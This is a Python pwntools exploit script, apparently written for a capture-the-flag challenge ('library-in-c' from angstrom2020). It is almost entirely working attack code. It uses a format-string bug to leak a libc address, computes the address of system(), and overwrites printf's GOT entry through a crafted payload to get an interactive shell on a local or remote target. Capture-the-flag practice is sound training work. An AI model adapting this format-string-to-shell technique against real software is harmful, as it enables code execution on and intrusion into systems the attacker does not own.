#!/usr/bin/env python2
'''
    author : tripoloski
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
from fmtstr64 import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/angstrom2020/pwn/library-in-c/library_in_c")
elf = ELF(TARGET)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    attach(r)
    # first stage
    off = 8
    leak_libc = "%27$p"

    printf_got = 0x000000601030
    main = 0x0000000000400747

    r.sendlineafter("?",leak_libc)
    r.recvuntil('Why hello there ')
    leak = int(r.recv(14) , 16)
    log.info("__libc_start_main+231 : " + hex(leak))

    libc_base = ((leak - 231) - libc.symbols['__libc_start_main'] ) 
    libc_system = libc_base + libc.symbols['system']
    log.info("libc_base : " + hex(libc_base))
    log.info("system()  : " + hex(libc_system))

    # final stage
    p = fmtstr64_payload(off , {printf_got:(libc_system & 0xffffffff)} , write_size="short" , write_type="partial")
    r.sendline(p)
    log.info("payload : " + p)
    log.info("length payload : " + str(len(p)))
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("shell.actf.co", 20201)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
